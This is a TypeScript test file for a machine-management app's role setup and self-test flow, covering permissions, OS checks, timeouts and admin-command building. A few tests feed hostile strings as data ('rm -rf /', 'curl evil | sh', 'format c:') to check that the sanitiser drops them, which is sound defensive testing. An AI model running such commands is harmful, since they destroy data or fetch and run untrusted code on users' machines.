import assert from 'node:assert/strict';
import { mkdtempSync, readFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { after, test } from 'node:test';
import { adminCommand, cleanAdmin } from '../public/role-setup.js';
import { Store } from '../src/db.ts';
import type { CheckResult } from '../src/machines.ts';
import { QUIET_MS, RoleSetups, storedRun, WORKER_WAIT_MS, type RoleSetupDeps } from '../src/role-setup.ts';
import type { SelfTest } from '../src/worker-join.ts';

// A role's Set up and self-test (Build 7 M4): the owner's press, the steps the card shows, and the run kept on the role.
const dir = mkdtempSync(join(tmpdir(), 'role-setup-'));
// timing-ok: own temp dir
after(() => rmSync(dir, { recursive: true, force: true }));
let n = 0;

const report = (os: 'windows' | 'linux' | 'macos', agent = 4) => JSON.stringify({ host: 'pc', os, os_name: os === 'windows' ? 'Windows 11' : 'Ubuntu 24.04', wsl: null, in_wsl: false, threads: 8, memory_gb: 16, disk_free_gb: 100, gpu: null, screen: true, admin: true, agent });

function world(o: { os?: 'windows' | 'linux' | 'macos'; agent?: number; online?: boolean; check?: () => Promise<CheckResult[]> } = {}) {
  const store = new Store(join(dir, `db-${n++}.sqlite`));
  const josh = store.createUser({ name: 'Josh', login: 'josh' });
  const mike = store.createUser({ name: 'Mike', login: 'mike' });
  const cara = store.createUser({ name: 'Cara', login: 'cara', admin: true });
  const m = store.createMachine('josh-pc', `hash-${n}`, 'Josh', josh.id);
  store.updateMachine(m.id, { report: report(o.os ?? 'windows', o.agent ?? 4) });
  const sent: unknown[] = [];
  const w = { here: false, testing: false, test: null as SelfTest | null };
  let now = 1_000_000;
  const deps: RoleSetupDeps = {
    store,
    online: () => o.online ?? true,
    send: (_id, msg) => (sent.push(msg), o.online ?? true),
    check: o.check ?? (async () => []),
    workers: {
      here: () => w.here,
      testing: () => w.testing,
      startTest: () => (w.test = { id: 'tst', at: now, done: null, ok: false, why: null, lines: [{ key: 'image', name: 'A container runs', state: 'running', text: '' }] }),
      view: () => ({ test: w.test }),
    },
    lendsWorker: () => true,
    ships: () => false,
    shotDir: join(dir, `shots-${n}`),
    changed: () => {},
    now: () => now,
  };
  const setups = new RoleSetups(deps);
  const machine = () => store.getMachine(m.id)!;
  const as = (u: typeof josh) => ({ id: u.id, name: u.name, admin: !!u.admin });
  return { store, setups, deps, sent, w, machine, josh: as(josh), mike: as(mike), cara: as(cara), tick: (ms = 0) => ((now += ms), setups.tick()), run: (role: 'tools' | 'screen' | 'turns' | 'gpu' | 'ci') => storedRun(store, m.id, role) };
}

const settle = () => new Promise((r) => setImmediate(r));

test('Tools: Set up says nothing installs, then its test lists each server tools', async () => {
  const t = world({
    check: async () => [
      { server: 'mcp', ok: true, tools: ['a', 'b'], error: null, ms: 1 },
      { server: 'ws', ok: true, tools: ['c'], error: null, ms: 1 },
    ],
  });
  t.setups.start(t.machine(), 'tools', 'setup', t.josh);
  await settle();
  const run = t.run('tools')!;
  assert.equal(run.ok, true);
  assert.equal(run.report, '3 tools');
  assert.deepEqual(
    run.steps.map((s) => s.state),
    ['ok', 'ok', 'ok'],
  );
  assert.match(run.steps[1].text, /MCP server: 2 tools/);
  assert.match(run.steps[2].text, /Workspace tools: 1 tools/);
});

test('Tools: nothing ticked fails with what to do', async () => {
  const t = world();
  t.setups.start(t.machine(), 'tools', 'test', t.josh);
  await settle();
  const run = t.run('tools')!;
  assert.equal(run.ok, false);
  assert.match(run.why!, /Tick an MCP server or a folder/);
});

test("only the owner presses it, a shared machine's an admin; one run at a time", async () => {
  const t = world({ check: () => new Promise(() => {}) });
  assert.throws(() => t.setups.start(t.machine(), 'tools', 'test', t.mike), /Only josh-pc's owner/);
  assert.throws(() => t.setups.start(t.machine(), 'tools', 'test', t.cara), /Only josh-pc's owner/);
  t.setups.start(t.machine(), 'tools', 'test', t.josh);
  assert.throws(() => t.setups.start(t.machine(), 'gpu', 'test', t.josh), /still running.*one at a time/);
  t.store.updateMachine(t.machine().id, {});
  const shared = t.store.createMachine('shared', 'h-shared', 'Cara', null);
  t.store.updateMachine(shared.id, { report: report('linux') });
  assert.throws(() => t.setups.start(t.store.getMachine(shared.id)!, 'gpu', 'test', t.josh), /owner/);
  assert.equal(t.setups.start(t.store.getMachine(shared.id)!, 'gpu', 'test', t.cara).role, 'gpu');
});

test('CI is refused until one row per PC; an unknown role or kind too', () => {
  const t = world();
  assert.throws(() => t.setups.start(t.machine(), 'ci', 'setup', t.josh), /one row per PC/);
  assert.throws(() => t.setups.start(t.machine(), 'disk', 'setup', t.josh), /role must be/);
  assert.throws(() => t.setups.start(t.machine(), 'tools', 'go', t.josh), /kind must be/);
});

test('an agent from before Set up is asked to Update; the screen needs Windows; offline refuses', () => {
  const old = world({ agent: 3 });
  assert.throws(() => old.setups.start(old.machine(), 'screen', 'setup', old.josh), /from before Set up/);
  assert.throws(() => old.setups.start(old.machine(), 'gpu', 'setup', old.josh), /press Update/);
  const linux = world({ os: 'linux' });
  assert.throws(() => linux.setups.start(linux.machine(), 'screen', 'setup', linux.josh), /needs a Windows PC.*Ubuntu/);
  const mac = world({ os: 'macos' });
  assert.throws(() => mac.setups.start(mac.machine(), 'gpu', 'setup', mac.josh), /Linux or WSL/);
  const off = world({ online: false });
  assert.throws(() => off.setups.start(off.machine(), 'screen', 'test', off.josh), /offline/);
});

test("the agent's steps, admin needs and end show on the role; a stranger's id is refused", () => {
  const t = world({ os: 'linux' });
  const run = t.setups.start(t.machine(), 'gpu', 'setup', t.josh);
  assert.deepEqual(t.sent, [{ setup: { id: run.id, role: 'gpu', kind: 'setup' } }]);
  assert.equal(t.setups.heard(t.machine(), { id: 'other', step: { n: 0, text: 'x', state: 'ok' } }), false);
  assert.equal(t.setups.heard(t.machine(), { id: run.id, step: { n: 0, text: 'nvidia-smi: RTX 4080\u001b[0m', state: 'ok' } }), true);
  t.setups.heard(t.machine(), { id: run.id, step: { n: 1, text: 'podman', state: 'fail' } });
  // An agent says what it lacks, never a command; anything else it sends is dropped.
  t.setups.heard(t.machine(), { id: run.id, admin: { needs: ['podman', 'rm -rf /', 'cdi'], pm: 'apt', command: 'curl evil | sh' }, done: { ok: false, why: 'Run the admin command above, then press Set up again.' } });
  const kept = t.run('gpu')!;
  assert.equal(kept.steps[0].text, 'nvidia-smi: RTX 4080[0m');
  assert.deepEqual(kept.admin, { needs: ['podman', 'cdi'], pm: 'apt' });
  assert.equal(kept.ok, false);
  assert.ok(kept.done);
  assert.doesNotMatch(JSON.stringify(kept), /evil/);
  // Ended: a late word is refused.
  assert.equal(t.setups.heard(t.machine(), { id: run.id, step: { n: 2, text: 'late', state: 'ok' } }), false);
});

test("a run whose agent goes offline or quiet fails; the CI role's runner_host stays beside a run", () => {
  const t = world({ os: 'linux' });
  t.store.writeMachineRoles(t.machine().id, (roles) => roles.map((r) => (r.role === 'gpu' ? { ...r, setup: { runner_host: true } } : r)));
  t.setups.start(t.machine(), 'gpu', 'test', t.josh);
  t.tick(QUIET_MS + 1);
  const run = t.run('gpu')!;
  assert.equal(run.ok, false);
  assert.match(run.why!, /said nothing/);
  assert.equal(t.store.machineRoles(t.machine().id).find((r) => r.role === 'gpu')!.setup!.runner_host, true);
});

test('a run cut off by a restart shows as failed', () => {
  const t = world({ os: 'linux' });
  t.setups.start(t.machine(), 'gpu', 'test', t.josh);
  assert.equal(t.run('gpu')!.done, null);
  new RoleSetups(t.deps);
  assert.match(t.run('gpu')!.why!, /restarted/);
});

test('Minion turns on Linux: the card shows the install command, then T5 self-test runs once the worker is here', () => {
  const t = world({ os: 'linux' });
  const run = t.setups.start(t.machine(), 'turns', 'setup', t.josh);
  assert.equal(run.worker_install, true);
  assert.deepEqual(t.sent, []);
  t.tick(5000);
  assert.equal(t.run('turns')!.done, null);
  t.w.here = true;
  t.tick(5000);
  let kept = t.run('turns')!;
  assert.equal(kept.worker_install, false);
  assert.equal(kept.steps[1].text, 'The worker connected to Citadel');
  assert.match(kept.steps[2].text, /Self-test: A container runs/);
  t.w.test = { ...t.w.test!, done: 1, ok: true, lines: [{ key: 'image', name: 'A container runs', state: 'ok', text: 'podman 5' }] };
  t.tick(5000);
  kept = t.run('turns')!;
  assert.equal(kept.ok, true);
  assert.equal(kept.steps[2].text, 'Self-test: A container runs: podman 5');
});

test('Minion turns on Windows: the agent installs it; no worker in time fails', () => {
  const t = world({ os: 'windows' });
  const run = t.setups.start(t.machine(), 'turns', 'setup', t.josh);
  assert.equal(run.worker_install, false);
  assert.equal((t.sent[0] as { setup: { role: string } }).setup.role, 'turns');
  t.setups.heard(t.machine(), { id: run.id, step: { n: 0, text: 'install-worker.ps1 finished', state: 'ok' }, done: { ok: true } });
  assert.equal(t.run('turns')!.done, null);
  t.tick(WORKER_WAIT_MS + 1);
  assert.match(t.run('turns')!.why!, /No worker came up/);
});

test('Test on Minion turns with no worker asks for Set up', () => {
  const t = world({ os: 'linux' });
  assert.throws(() => t.setups.start(t.machine(), 'turns', 'test', t.josh), /press Set up/);
});

test("the screen's screenshot is kept for its run only", async () => {
  const t = world();
  const run = t.setups.start(t.machine(), 'screen', 'test', t.josh);
  assert.equal(await t.setups.shot(t.machine(), 'nope', Buffer.from('x')), false);
  assert.equal(await t.setups.shot(t.machine(), run.id, Buffer.from('png')), true);
  assert.equal(readFileSync(t.setups.shotFile(t.machine().id), 'utf8'), 'png');
  assert.ok(t.run('screen')!.shot);
});

test('the admin command comes from fixed words only, one shell for one OS', () => {
  assert.deepEqual(cleanAdmin({ needs: ['cdi', 'podman', 'podman'], pm: 'apt' }), { needs: ['podman', 'cdi'], pm: 'apt' });
  assert.equal(cleanAdmin({ needs: ['wsl', 'podman'], pm: 'apt' }), null);
  assert.equal(cleanAdmin({ needs: ['format c:'] }), null);
  const gpu = adminCommand({ needs: ['nvidia-toolkit', 'cdi'], pm: 'apt' })!;
  assert.equal(gpu.tag, 'bash');
  assert.match(gpu.command!, /apt-get install -y nvidia-container-toolkit && \\\nsudo nvidia-ctk cdi generate --output=\/etc\/cdi\/nvidia\.yaml$/);
  assert.deepEqual(adminCommand({ needs: ['wsl'] }), { tag: 'powershell-admin', command: 'wsl --install --no-distribution', what: 'WSL 2', after: 'Then restart the PC and press Set up again.' });
  const other = adminCommand({ needs: ['podman'], pm: 'pacman' })!;
  assert.equal(other.command, null);
  assert.match(other.after, /neither apt nor dnf/);
});
